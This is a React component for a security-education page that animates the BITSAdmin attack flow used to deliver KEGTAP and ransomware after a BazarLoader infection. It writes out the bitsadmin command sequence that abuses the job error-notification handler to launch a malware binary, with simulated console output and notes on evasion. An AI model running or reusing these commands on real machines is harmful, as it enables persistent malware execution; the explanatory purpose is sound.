"use client"

import React, { useState } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { ChevronRight, AlertTriangle, Download, CheckCircle, XCircle, Terminal, Info } from 'lucide-react'

export default function BITSAdminAttackFlow() {
  const [activeStep, setActiveStep] = useState<number | null>(null)

  const steps = [
    {
      number: 1,
      title: "Initial Compromise",
      tool: "BazarLoader",
      description: "Victim system is infected with BazarLoader malware",
      command: "",
      status: "compromise",
      color: "red"
    },
    {
      number: 2,
      title: "BITS Job Creation",
      tool: "bitsadmin.exe",
      description: "KEGTAP creates a malicious BITS job with specific parameters",
      command: "bitsadmin /create /download MyJob",
      status: "setup",
      color: "orange"
    },
    {
      number: 3,
      title: "Add Fake Transfer",
      tool: "bitsadmin.exe",
      description: "Configure job to download from non-existent localhost resource",
      command: "bitsadmin /addfile MyJob http://localhost/nonexistent.file C:\\temp\\output.txt",
      status: "setup",
      color: "orange"
    },
    {
      number: 4,
      title: "Set Notification Handler",
      tool: "bitsadmin.exe",
      description: "Configure command to execute when job encounters error state",
      command: "bitsadmin /SetNotifyCmdLine MyJob C:\\Windows\\Temp\\kegtap.exe \"\"",
      status: "persistence",
      color: "purple"
    },
    {
      number: 5,
      title: "Resume Job",
      tool: "bitsadmin.exe",
      description: "Start the BITS job, triggering the download attempt",
      command: "bitsadmin /resume MyJob",
      status: "trigger",
      color: "blue"
    },
    {
      number: 6,
      title: "Download Fails (By Design)",
      tool: "BITS Service",
      description: "Job attempts localhost download, fails as expected, enters error state",
      command: "",
      status: "error",
      color: "yellow"
    },
    {
      number: 7,
      title: "Error Triggers Notification",
      tool: "BITS Service",
      description: "Error state triggers SetNotifyCmdLine, executing KEGTAP",
      command: "C:\\Windows\\Temp\\kegtap.exe",
      status: "execution",
      color: "red"
    },
    {
      number: 8,
      title: "Malware Deployment",
      tool: "KEGTAP",
      description: "KEGTAP fetches and deploys final payload (Cobalt Strike, Ryuk, etc.)",
      command: "",
      status: "payload",
      color: "red"
    }
  ]

  const getStatusIcon = (status: string) => {
    switch (status) {
      case "compromise":
        return <AlertTriangle className="h-5 w-5 text-red-400" />
      case "setup":
        return <Terminal className="h-5 w-5 text-orange-400" />
      case "persistence":
        return <Download className="h-5 w-5 text-purple-400" />
      case "trigger":
        return <CheckCircle className="h-5 w-5 text-blue-400" />
      case "error":
        return <XCircle className="h-5 w-5 text-yellow-400" />
      case "execution":
      case "payload":
        return <AlertTriangle className="h-5 w-5 text-red-400" />
      default:
        return <ChevronRight className="h-5 w-5 text-slate-400" />
    }
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case "compromise":
        return "bg-red-500/20 border-red-500/30"
      case "setup":
        return "bg-orange-500/20 border-orange-500/30"
      case "persistence":
        return "bg-purple-500/20 border-purple-500/30"
      case "trigger":
        return "bg-blue-500/20 border-blue-500/30"
      case "error":
        return "bg-yellow-500/20 border-yellow-500/30"
      case "execution":
      case "payload":
        return "bg-red-500/20 border-red-500/30"
      default:
        return "bg-slate-500/20 border-slate-500/30"
    }
  }

  const getStepOutput = (stepIdx: number | null) => {
    if (stepIdx === null) return "Waiting for trigger..."

    switch (stepIdx) {
      case 1:
        return "[+] Job {12A4B...} created successfully.\n[+] Type: DOWNLOAD\n[+] Priority: NORMAL"
      case 2:
        return "[+] Added http://localhost/nonexistent.file -> C:\\temp\\output.txt"
      case 3:
        return "[+] Notification Command Line set to: C:\\Windows\\Temp\\kegtap.exe\n[+] Notification Flags set to: 0x01 (Error)"
      case 4:
        return "[+] Job {12A4B...} resumed.\n[+] State: CONNECTING..."
      case 5:
        return "[-] ERROR: 0x80190194 - File not found.\n[+] Target State: TRANSIENT_ERROR\n[+] Triggering NOTIFY_COMMAND_LINE..."
      case 6:
        return "[!] ALERT: Executing C:\\Windows\\Temp\\kegtap.exe\n[!] Parent: svchost.exe (BITS)\n[!] Integrity: SYSTEM"
      default:
        return "[+] Task executed."
    }
  }

  return (
    <div className="my-8">
      <Card className="bg-gradient-to-br from-slate-900 to-slate-800 border-slate-700">
        <CardHeader>
          <CardTitle className="text-2xl text-white flex items-center gap-2">
            <Download className="h-6 w-6 text-purple-400" />
            BITSAdmin Attack Flow: KEGTAP Ransomware Delivery
          </CardTitle>
          <CardDescription className="text-slate-300">
            How attackers abuse Background Intelligent Transfer Service (BITS) for persistence and malware deployment
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <div className="space-y-4">
              {steps.map((step, idx) => (
                <div key={idx}>
                  <div
                    className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${activeStep === idx
                      ? getStatusColor(step.status) + " shadow-lg scale-[1.02]"
                      : "bg-slate-800/10 border-slate-700/50 hover:border-slate-600"
                      }`}
                    onClick={() => setActiveStep(activeStep === idx ? null : idx)}
                  >
                    <div className="flex items-start gap-3">
                      <div className="flex-shrink-0 mt-1">
                        {getStatusIcon(step.status)}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-1">
                          <span className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">Step {step.number}</span>
                          <h3 className="text-sm font-bold text-white">{step.title}</h3>
                        </div>
                        <p className="text-slate-400 text-xs line-clamp-2">{step.description}</p>
                      </div>
                    </div>
                  </div>

                  {idx < steps.length - 1 && (
                    <div className="flex justify-center my-1">
                      <div className="w-0.5 h-3 bg-slate-700/50"></div>
                    </div>
                  )}
                </div>
              ))}
            </div>

            <div className="flex flex-col gap-4">
              {/* Terminal Simulation */}
              <div className="flex-1 min-h-[300px] bg-black rounded-lg border border-slate-700 p-0 overflow-hidden flex flex-col shadow-2xl">
                <div className="bg-slate-800 px-4 py-2 border-b border-slate-700 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 rounded-full bg-red-500" />
                    <div className="w-3 h-3 rounded-full bg-yellow-500" />
                    <div className="w-3 h-3 rounded-full bg-green-500" />
                    <span className="ml-2 text-[10px] font-mono text-slate-400 uppercase tracking-widest">BITSADMIN_CONSOLE</span>
                  </div>
                  <Badge variant="outline" className="text-[9px] border-slate-600 text-slate-400">SESSION_0</Badge>
                </div>
                <div className="p-4 font-mono text-xs flex-1 overflow-auto bg-[#0c0c0c]">
                  <div className="flex items-start gap-2 mb-4">
                    <span className="text-green-500">C:\&gt;</span>
                    <span className="text-white">bitsadmin /list /allusers</span>
                  </div>

                  {activeStep !== null ? (
                    <div className="space-y-4 animate-in fade-in duration-500">
                      <div className="flex items-start gap-2">
                        <span className="text-green-500">C:\&gt;</span>
                        <span className="text-cyan-400">{steps[activeStep].command || "# Execution triggered by system state"}</span>
                      </div>
                      <div className="text-slate-300 whitespace-pre-wrap leading-relaxed opacity-80 border-l-2 border-blue-500/30 pl-3">
                        {getStepOutput(activeStep)}
                      </div>
                    </div>
                  ) : (
                    <div className="text-slate-600 italic">Select an attack step to view console simulation...</div>
                  )}

                  <div className="mt-4 flex items-center gap-2 animate-pulse">
                    <span className="text-green-500">C:\&gt;</span>
                    <div className="w-2 h-4 bg-white opacity-50" />
                  </div>
                </div>
              </div>

              {/* Context Panel */}
              {activeStep !== null && (
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700 animate-in zoom-in-95 duration-200">
                  <div className="flex items-center gap-2 mb-2">
                    <Info className="h-4 w-4 text-blue-400" />
                    <h4 className="text-xs font-bold text-white uppercase tracking-tight">Technical Nuance</h4>
                  </div>
                  <p className="text-xs text-slate-300 leading-relaxed italic">
                    {activeStep === 5
                      ? "The transition to 'TRANSIENT_ERROR' is the key evasion tactic here; it doesn't look like an immediate failure."
                      : steps[activeStep].description}
                  </p>
                </div>
              )}
            </div>
          </div>

          <div className="mt-8 space-y-4">
            <div className="p-4 bg-red-500/10 border-2 border-red-500/20 rounded-lg">
              <div className="flex items-start gap-3">
                <AlertTriangle className="h-5 w-5 text-red-400 mt-0.5 flex-shrink-0" />
                <div>
                  <p className="text-red-300 font-semibold mb-2">Why This Technique Is Effective</p>
                  <ul className="text-slate-300 text-sm space-y-1 list-disc list-inside">
                    <li>BITS is a <strong>legitimate Windows service</strong> used by Windows Update</li>
                    <li>The actual malware download occurs <strong>after</strong> the BITS job triggers</li>
                    <li>BITS job appears to download from <code className="text-cyan-300">localhost</code>, not external C2</li>
                    <li>Persistence survives <strong>reboots and cleanup attempts</strong></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
